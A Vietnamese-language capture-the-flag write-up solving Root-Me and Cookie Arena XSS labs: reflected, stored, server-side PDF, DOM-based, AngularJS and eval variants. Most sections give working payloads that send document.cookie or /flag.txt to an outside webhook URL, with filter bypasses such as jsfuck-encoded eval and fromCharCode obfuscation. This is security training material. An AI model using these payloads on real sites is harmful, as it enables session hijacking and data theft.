# Cross-site scripting (XSS)

## Root-me-1: [XSS - Reflected](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)

Trong lab ta cần lấy được cookie của admin thông qua Reflected XSS

Thử truyền tham số bất kỳ vào `?p`

![image.png](Images/image.png)

Khi inspect thì `test` được truyền vào đang ở trong `<a>`, vậy trước hết phải escape ra khỏi attribute `href=` do vẫn còn trong tag `<a>` nên ta có thể thêm 1 event attribute khác như `onmousemove`để thực hiện `alert`

payload: `?p=test' onmousemove='alert(1)`

![image.png](Images/image%201.png)

![image.png](Images/image%202.png)

okay, vậy bây h chỉ cần tạo link webhook và report url cho admin để lấy cookie

payload: `?p=test' onmousemove='document.location="[https://webhook.site/2d5ca3fe-362e-49fa-a0b5-9b1c76f8a280?data=](https://webhook.site/2d5ca3fe-362e-49fa-a0b5-9b1c76f8a280?data=)".concat(document.cookie)`

![reflect XSS.png](Images/reflect_XSS.png)

## Root-me-2: [XSS - Server Side](https://www.root-me.org/en/Challenges/Web-Server/XSS-Server-Side)

Trong lab này ta cần đọc được flag trong /flag.txt

Thử sign up, login

![image.png](Images/image%203.png)

Tải thử certification

![image.png](Images/image%204.png)

Như vậy file pdf tải về sửa được sử theo `firstname`, `lastname` và `message` truyền vào khi muốn tải certification

Vì đề bài hint là XSS - Server side nên ta sẽ thử sign bằng payload XSS đơn giản

payload: `<h1>Hello</h1>`

![image.png](Images/image%205.png)

Như vậy trong phần sign up thì `firstname`, `lastname` bị XSS

Để đọc /flag.txt thì cần phải biết ta đang ở directory nào

payload: `<script> document.write(window.location) </script>`

![image.png](Images/image%206.png)

Đang ở [`file:///tm](file:///tmp/)p`, ta sẽ viết code javascript để gửi HTTP request thông tin của`flag.txt` ở server về webhook

![image.png](Images/image%207.png)

Vào phần sign và tạo 1 tài khoản với `firstname` hoặc `lastname`như payload trên và tải certification để thực hiện payload từ server-side

![SSXSS.png](Images/SSXSS.png)

## Root-me-3: [XSS - Stored 1](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)

Để hoàn thành lab cần phải lấy được cookie của admin

Test payload vào phần message: `<script>alert(1)</script>`

![image.png](Images/image%208.png)

→ alert thành công!

![image.png](Images/image%209.png)

Tạo 1 tag `<p>` để lưu payload trên phần comment của web và gửi cookie của bất kỳ ai vào phần này về webhook

payload: `<p><script>document.location="[https://webhook.site/2d5ca3fe-362e-49fa-a0b5-9b1c76f8a280?data=](https://webhook.site/2d5ca3fe-362e-49fa-a0b5-9b1c76f8a280?data=)".concat(document.cookie)</script></p>`

![Store XSS 1.png](Images/Store_XSS_1.png)

## Root-me-4: [XSS - Stored 2](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-2)

Thử truyền payload cơ bản vào phần message: `<script>alert(1)</script>`

![image.png](Images/image%2010.png)

Vào inspect, ta có thể thấy payload đã bị HTML entity code

![Screenshot 2025-04-05 212713.png](Images/Screenshot_2025-04-05_212713.png)

Phần status tự nhiên có màu xanh nhìn khá hay → Thử vào burpsuite thì thấy có thể chỉnh sửa được thành admin

![image.png](Images/image%2011.png)

Như vậy phần hiển thị status này có khả năng bị XSS vì nó cũng ở trong 1 tag như thế này

![image.png](Images/image%2012.png)

Thử truyền payload vào cookie status: `"><script>alert(1)</script>` (escape khỏi `class` bằng `">` và `alert`)

![image.png](Images/image%2013.png)

alert thành công!

![image.png](Images/image%2014.png)

Tạo payload store ở phần comment để gửi cookie của admin về webhook:

payload: `"><script>document.location="[https://webhook.site/2d5ca3fe-362e-49fa-a0b5-9b1c76f8a280?data=](https://webhook.site/2d5ca3fe-362e-49fa-a0b5-9b1c76f8a280?data=)".concat(document.cookie)</script>`

![Store XSS 2.png](Images/Store_XSS_2.png)

## Root-me-5: [XSS - Stored - filter bypass](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-filter-bypass)

Thử truyền payload cơ bản

![image.png](Images/image%2015.png)

![image.png](Images/image%2016.png)

Dù đã thử nhiều loại encode và các loại tag khác nhau nhưng vẫn không bypass được cái filter này 😢

Tham khảo:

 https://github.com/iL3sor/rootme-writeup/blob/main/XSS%20-%20Stored%20-%20filter%20bypass%20%5B80%20Points%5D.md

Payload: `<button autofocus onfocus=(eval)("jsfuck encode")></button>`

Giải thích: `onfocus` là 1 event handler và được `autofocus` nên sẽ tự động thực hiện `eval`

[https://jsfuck.com/](https://jsfuck.com/)

[https://github.com/aemkei/jsfuck/blob/main/jsfuck.js](https://github.com/aemkei/jsfuck/blob/main/jsfuck.js)

Jsfuck là có syntax khá phức tạp nhưng nó hoạt động

Thử alert bằng payload trên

![image.png](Images/image%2017.png)

alert thành công

![image.png](Images/image%2018.png)

Bây giờ chỉ cần encode payload: `document.location="[https://webhook.site/2d5ca3fe-362e-49fa-a0b5-9b1c76f8a280?data=](https://webhook.site/2d5ca3fe-362e-49fa-a0b5-9b1c76f8a280?data=)".concat(document.cookie)` sang jsfuck và truyền vào `eval` là đã gửi được cookie

![XSS - Stored - filter bypass.png](Images/XSS_-_Stored_-_filter_bypass.png)

## Root-me-6: [XSS DOM Based - Introduction](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction?lang=en)

Thử truyền tham số bất kỳ vào parameter`?number`

![image.png](Images/image%2019.png)

Vào inspect, có thể thấy user input được truyền vào `var number = 'aaaaaaaaa';`

![image.png](Images/image%2020.png)

Escape khỏi biến `number` và `alert`

payload: `';alert(1)//`

`var number = '';alert(1)//';` (number sẽ có giá trị `''` và được ngắt bằng `;` thực hiện `alert(1)` và comment những phần phía sau `//`)

![image.png](Images/image%2021.png)

alert thành công

Thử lấy cookie của bản thân và gửi về webhook

payload: `';document.location="[https://webhook.site/2d5ca3fe-362e-49fa-a0b5-9b1c76f8a280?data=](https://webhook.site/2d5ca3fe-362e-49fa-a0b5-9b1c76f8a280?data=)".concat(document.cookie)//` —> Thành công!

Vào phần contact và gửi url chứa payload lấy cookie cho admin 

![DOM_XSS_intro.png](Images/DOM_XSS_intro.png)

## Root-me-7: [XSS DOM Based - AngularJS](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-AngularJS)

Chall này sử dụng framework Angularjs, có thể nhận biết khi thấy directive `ng-app` trong code html

![image.png](Images/image%2022.png)

Angularjs có chức năng thực hiện code nằm trong dấu `{{ code }}`

Thử truyền `{{ 7*7 }}` vào parameter `?name`

![image.png](Images/image%2023.png)

Code được thực hiện!!

Angularjs khác gì so với SSTI?

- DOM-Based XSS (AngularJS) có payload được thực hiện ở phía client-side và không cần template engine (tức là ko có giao tiếp với server)
- SSTI có payload được thực hiện ở server-side

`{{ “hello”.constructor }}` —> String()

`{{ constructor.constructor }}` —>Function() (nằm ở global scope)

[Document Link](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function)

![image.png](Images/image%2024.png)

![image.png](Images/image%2025.png)

Có thể thấy `Function()` có thể thực hiện code ở global

payload: `{{ constructor.constructor("alert(1)")() }}` (tương đương new Function(”alert(1)”) và được nằm trong `{}` nên alert(1) sẽ được thực thi)

![image.png](Images/image%2026.png)

Tạo payload lấy cookie của admin thông qua url và gửi về webhook

payload: `{{constructor.constructor(&#39;document.location="https://webhook.site/2d5ca3fe-362e-49fa-a0b5-9b1c76f8a280?data=".concat(document.cookie)&#39;)()}}` (Dấu `'` đã bị filter nên sẽ HTML entity encode thành `&#39;`)

—> Gửi được cookie của bản thân thành công

Nhưng vì 1 lý do nào đó mà khi craft vào link payload y trang vậy để lấy admin cookie thì lại không có phản hồi từ webhook

Thử dùng funcion `String.fromCharCode()` chuyển từ ascii sang string

payload: `{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(100, 111, 99, 117, 109, 101, 110, 116, 46, 108, 111, 99, 97, 116, 105, 111, 110, 61, 39, 104, 116, 116, 112, 115, 58, 47, 47, 119, 101, 98, 104, 111, 111, 107, 46, 115, 105, 116, 101, 47, 50, 100, 53, 99, 97, 51, 102, 101, 45, 51, 54, 50, 101, 45, 52, 57, 102, 97, 45, 97, 48, 98, 53, 45, 57, 98, 49, 99, 55, 54, 102, 56, 97, 50, 56, 48, 63, 100, 97, 116, 97, 61, 39, 46, 99, 111, 110, 99, 97, 116, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101, 41))()}}` (ascii encode của payload ban đầu)

—> Lấy cookie của admin thành công

![DOM_XSS_Angularjs.png](Images/DOM_XSS_Angularjs.png)

## Root-me-8: [**XSS DOM Based - Eval**](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Eval)

Thử truyền tham số bất kỳ vào parameter `?calculation`

![image.png](Images/image%2027.png)

Tham số đầu vào phải có dạng giống như regex này: digit (+, -, *, /) digit

Khi truyền 1 phép tính vd như `5+5` thì tham số này sẽ được đưa vào hàm `eval()` như sau

![image.png](Images/image%2028.png)

Thử payload: `5 + 5 + alert(1)`    (alert sẽ được thực hiện trong `eval()`)

![image.png](Images/image%2029.png)

Web đã filter dấu () —> dùng backticks để thay dấu ()

payload: `5+5+alert`1``

![image.png](Images/image%2030.png)

alert thành công, thử gửi cookie của bản thân về webhook

payload: `5+5+prompt`${document.location=[https://webhook.site/2d5ca3fe-362e-49fa-a0b5-9b1c76f8a280?data=](https://webhook.site/2d5ca3fe-362e-49fa-a0b5-9b1c76f8a280?data=)+document.cookie}`` (prompt sẽ trả về 1 box thông báo và thực thi lênh bên trong nó vì đang sử dụng ${} trong eval)

![image.png](Images/image%2031.png)

Gửi cookie thành công !!

Bây giờ chỉ cần tạo url và gửi cho admin

![DOM_XSS_eval.png](Images/DOM_XSS_eval.png)

## Root-me-9: [**XSS DOM Based - Filters Bypass**](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Filters-Bypass)

Truyền tham số bất kỳ vào `?number`

![image.png](Images/image%2032.png)

Tham số sẽ được lưu trong biến `number`

Thử thoát khỏi biến number và alert

payload: `'-alert(1)//`

![image.png](Images/image%2033.png)

alert thành công

Thử truyền payload lấy cookie thì web lại hiện ra thông báo

payload: `'-document.location='[https://webhook.site/2d5ca3fe-362e-49fa-a0b5-9b1c76f8a280?data=](https://webhook.site/2d5ca3fe-362e-49fa-a0b5-9b1c76f8a280?data=)'.concat(document.cookie)//`

![image.png](Images/image%2034.png)

Có thể thử encode hoặc bỏ luôn `https` trong payload để bypass được filter này

payload: `'-document.location='[//webhook.site/2d5ca3fe-362e-49fa-a0b5-9b1c76f8a280?data=](https://webhook.site/2d5ca3fe-362e-49fa-a0b5-9b1c76f8a280?data=)'.concat(document.cookie)//`

—> Không có gì xảy ra

![image.png](Images/image%2035.png)

Sau khi check lại payload thì có vẽ như phần `' - document.location` không được thực thi và việc kết hợp toán tử `-` với 1 object là `document.location` thì javascript sẽ cố chuyển object đó về 1 số nào đó và kết quả sẽ là `NaN`

Thử payload khác: `1'?alert`1`:'huhh` —> alert thành công

`var number = '1'?alert`1`:'huhh';` 

(giá trị 1 luôn đúng sẽ thực hiện alert, nếu sai thì sẽ huhh)

payload: `1'?document.location='[//webhook.site/2d5ca3fe-362e-49fa-a0b5-9b1c76f8a280?data='.concat(document.cookie):'](https://webhook.site/2d5ca3fe-362e-49fa-a0b5-9b1c76f8a280?data=%27.concat(document.cookie):%27a)huhh`

—> Gửi cookie thành công

Tạo url và report cho admin

![DOM_XSS_filter_bypass.png](Images/DOM_XSS_filter_bypass.png)

## Cookie-Arena: [**Steal Cookie**](https://battle.cookiearena.org/challenges/web/steal-cookie)

Lab này không có filter hay gì hết chỉ cần truyền payload gửi cookie vào tab flag là xong

payload: `<script>document.location="[https://webhook.site/2d5ca3fe-362e-49fa-a0b5-9b1c76f8a280?data=](https://webhook.site/2d5ca3fe-362e-49fa-a0b5-9b1c76f8a280?data=)".concat(document.cookie)</script>`

![cookiehanhoan.png](Images/cookiehanhoan.png)